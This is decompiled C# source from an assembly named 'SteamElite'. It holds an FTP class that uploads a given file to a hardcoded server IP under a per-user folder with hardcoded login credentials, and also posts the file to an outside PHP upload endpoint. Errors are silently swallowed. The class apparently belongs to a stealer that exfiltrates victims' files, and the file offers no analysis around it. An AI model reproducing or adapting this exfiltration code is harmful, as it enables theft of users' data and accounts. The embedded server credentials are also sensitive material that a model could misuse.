// Decompiled with JetBrains decompiler
// Type: FTP
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using SteamElite;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

internal class FTP
{
  public void FTPUploadFile(string filename)
  {
    FileInfo fileInfo = new FileInfo(filename);
    string str = "ftp://87.236.19.40/" + Program.usrid + "/" + fileInfo.Name;
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(new Uri("ftp://87.236.19.40/" + Program.usrid + "/" + fileInfo.Name));
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("bebravse_elite", "D7XA*!2Y");
    ftpWebRequest.KeepAlive = false;
    try
    {
      int num1 = (int) MessageBox.Show(FileVersionInfo.GetVersionInfo(Process.GetCurrentProcess().MainModule.FileName).ProductName);
      int num2 = (int) MessageBox.Show(Encoding.ASCII.GetString(new WebClient().UploadFile("https://justforlife.info/2gis/upload.php", filename)));
    }
    catch
    {
    }
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.ContentLength = fileInfo.Length;
    int count1 = 4096;
    byte[] buffer = new byte[count1];
    FileStream fileStream = fileInfo.OpenRead();
    try
    {
      Stream requestStream = ftpWebRequest.GetRequestStream();
      for (int count2 = fileStream.Read(buffer, 0, count1); count2 != 0; count2 = fileStream.Read(buffer, 0, count1))
        requestStream.Write(buffer, 0, count2);
      requestStream.Close();
      fileStream.Close();
    }
    catch
    {
    }
  }
}
